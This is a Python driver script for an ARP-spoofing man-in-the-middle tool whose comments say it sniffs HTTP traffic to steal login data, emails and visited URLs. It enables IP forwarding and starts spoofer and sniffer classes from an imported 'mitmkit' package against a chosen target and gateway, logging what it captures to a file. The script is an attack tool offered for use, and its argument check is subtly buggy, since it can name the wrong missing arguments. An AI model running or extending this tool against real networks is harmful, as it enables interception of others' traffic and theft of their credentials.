#script that runs a man in the middle attack usng ARP spoofing
#it also sniffs HTTPRequests to steal login data, emails and visited URL's
#should also auto enable ip forwarding (working on that)

import _thread, sys, logging, argparse
from time import sleep

from mitmkit.ip_forwarding_class import PacketForwarding
from mitmkit.packet_sniffer_class import PacketSniffer
from mitmkit.arp_spoof_class import ArpSpoofer

def getArguments():
    #This function gets the command line arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway / Router IP")
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to use for sniffing.")
    options = parser.parse_args()
    return options

def createLogger():
    logger = logging.getLogger('mitm_arp_spoof')
    logger.setLevel(logging.DEBUG)
    fh = logging.FileHandler('log.txt',mode='w')
    fh.setLevel(logging.DEBUG)
    ch = logging.StreamHandler()
    ch.setLevel(logging.INFO)
    formatter = logging.Formatter('%(asctime)s %(message)s')
    formatter2 = logging.Formatter('%(message)s')
    fh.setFormatter(formatter)
    ch.setFormatter(formatter2)
    logger.addHandler(fh)
    logger.addHandler(ch)
    return logger

def classPrint(text, task):
    #this is not a class yet, but it might be once I implement a GUI
    if (task == 'positive'):
        msg = "[+] MITM -> " + text
        logger.debug(msg)

def printBanner():
    lines = ["  ▄████   ▄████     ██░ ██ ▄▄▄█████▓▄▄▄█████▓ ██▓███  ",
    " ██▒ ▀█▒ ██▒ ▀█▒   ▓██░ ██▒▓  ██▒ ▓▒▓  ██▒ ▓▒▓██░  ██▒",
    "▒██░▄▄▄░▒██░▄▄▄░   ▒██▀▀██░▒ ▓██░ ▒░▒ ▓██░ ▒░▓██░ ██▓▒",
    "░▓█  ██▓░▓█  ██▓   ░▓█ ░██ ░ ▓██▓ ░ ░ ▓██▓ ░ ▒██▄█▓▒ ▒",
    "░▒▓███▀▒░▒▓███▀▒   ░▓█▒░██▓  ▒██▒ ░   ▒██▒ ░ ▒██▒ ░  ░",
    " ░▒   ▒  ░▒   ▒     ▒ ░░▒░▒  ▒ ░░     ▒ ░░   ▒▓▒░ ░  ░",
    "  ░   ░   ░   ░     ▒ ░▒░ ░    ░        ░    ░▒ ░     ",
    "  ░   ░ ░ ░   ░     ░  ░░ ░  ░         ░     ░░       ",
    "      ░       ░     ░  ░  ░                           "]
    for line in lines:
        print(line)

def validateArgs(args):
    flag = 0
    arguments = [options.interface, options.gateway, options.target]
    missing = []
    id = 0
    names = {
        1: "interface",
        2: "gateway",
        3: "target"
    }
    for argument in arguments:
        if not argument:
            id += 1
            missing.append(names.get(id,0))
    if missing:
        print("[-] Missing the following argument(s): %s. Try -h for help" % ' & '.join(missing))
        sys.exit(0)

printBanner()
logger = createLogger()
classPrint('Created logger.', 'positive')
options = getArguments()
validateArgs(options)
ip_forward = PacketForwarding(logger)
sniffer = PacketSniffer(options.interface, logger)
spoofer = ArpSpoofer(options.target, options.gateway, logger)
ip_forward.forwardPacket()
sniffer.start()
spoofer.start()

#Main loop
try:
    while True:
        sleep(100)
#Handling user exit
except KeyboardInterrupt:
    sniffer.join(2.0)
    if sniffer.isAlive():
        sniffer.socket.close()
    spoofer.join(0)
    ip_forward.restoreSettings()
